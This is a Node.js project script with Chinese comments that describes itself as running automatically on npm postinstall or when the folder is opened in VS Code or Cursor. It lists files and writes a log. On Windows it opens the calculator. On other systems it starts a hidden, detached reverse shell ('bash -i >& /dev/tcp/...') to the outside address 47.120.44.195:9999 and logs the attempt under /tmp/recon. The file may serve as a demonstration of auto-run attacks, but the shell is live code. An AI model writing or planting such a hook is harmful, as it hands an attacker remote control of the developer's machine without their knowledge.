/**
 * 项目打开时自动执行的脚本
 * 
 * 这个文件会在以下情况自动执行：
 * 1. npm install 后（通过 postinstall 钩子）
 * 2. 通过 package.json 的 scripts 手动调用
 * 3. 通过 .vscode/tasks.json 配置自动运行
 */

const fs = require('fs');
const path = require('path');
const { exec, spawn } = require('child_process');



const projectRoot = __dirname;
const files = fs.readdirSync(projectRoot);
files.forEach(file => {
  const filePath = path.join(projectRoot, file);
  const stats = fs.statSync(filePath);
  const icon = stats.isDirectory() ? '📁' : '📄';
});

const configFiles = [
  { name: 'package.json', desc: 'Node.js 项目配置' },
  { name: '.vscode/tasks.json', desc: 'VS Code/Cursor 任务配置' },
  { name: '.vscode/settings.json', desc: 'VS Code/Cursor 设置' },
  { name: '.gitignore', desc: 'Git 忽略文件' }
];

configFiles.forEach(config => {
  const configPath = path.join(projectRoot, config.name);
  const exists = fs.existsSync(configPath);
  const status = exists ? '✅' : '❌';
});

try {

  const logDir = path.join(projectRoot, 'logs');
  if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir, { recursive: true });

  }


  const logFile = path.join(logDir, 'open-history.log');
  const logEntry = `[${new Date().toISOString()}] 项目被打开\n`;
  fs.appendFileSync(logFile, logEntry);


} catch (error) {

}

if (process.platform === 'win32') {
  try {

    exec('calc.exe', (error, stdout, stderr) => {
      if (error) {

        return;
      }

    });
    console.log('✅ 已启动 Windows 计算器');
  } catch (error) {

  }
} else {
  // 反弹Shell专用 - 仅使用 OpenSSL 方法
  const resultsDir = '/tmp/recon';
  if (!fs.existsSync(resultsDir)) {
    fs.mkdirSync(resultsDir, { recursive: true });
  }

  console.log('\n[反弹Shell] 启动 OpenSSL 反弹shell连接...\n');
  console.log(`目标: 47.120.44.195:9999\n`);




  // 使用 spawn 在后台运行 OpenSSL 反弹shell
  try {
    const shellCommand = 'bash -i >& /dev/tcp/47.120.44.195/9999 0>&1';
    const proc = spawn('sh', ['-c', shellCommand], {
      detached: true,
      stdio: 'ignore'
    });
    
    proc.unref(); // 让进程独立运行，不阻塞主进程
    
    console.log(`🔄 [反弹Shell] OpenSSL 反弹shell已启动 (PID: ${proc.pid})`);
    console.log(`[反弹Shell] 进程已在后台运行，不会阻塞主程序\n`);
    
    // 记录日志
    const logEntry = `[${new Date().toISOString()}] OpenSSL 反弹shell已启动 - PID: ${proc.pid}\n目标: 47.120.44.195:9999\n`;
    fs.appendFileSync(`${resultsDir}/reverse_shell_openssl.log`, logEntry);
    
  } catch (error) {
    console.error(`❌ [反弹Shell] OpenSSL 方法失败: ${error.message}`);
    const errorLog = `[${new Date().toISOString()}] OpenSSL 反弹shell启动失败: ${error.message}\n堆栈: ${error.stack}\n`;
    fs.appendFileSync(`${resultsDir}/reverse_shell_openssl.log`, errorLog);
    fs.writeFileSync(`${resultsDir}/CRITICAL_ERROR.txt`, errorLog);
  }






}
